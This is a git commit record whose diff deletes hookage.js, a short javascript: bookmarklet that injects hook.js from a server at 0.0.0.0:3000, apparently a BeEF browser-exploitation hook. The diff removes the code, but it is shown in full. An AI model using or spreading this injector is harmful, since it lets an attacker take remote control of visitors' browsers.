d9a184f1d3ccd65fb709ad3d6818bd6d7848bded
MastrCheef99 <120070513+MastrCheef99@users.noreply.github.com>
2023-05-18 09:42:59 -0400

    Delete hookage.js

--- hookage.js
+++
@@ -1,5 +0,0 @@
-javascript: (function () { var url = %27https://0.0.0.0:3000/hook.js%27;
-if (typeof beef == %27undefined%27) { 
-  var bf = document.createElement(%27script%27); 
-  bf.type = %27text%2fjavascript%27; bf.src = url; 
-  document.body.appendChild(bf);}})();
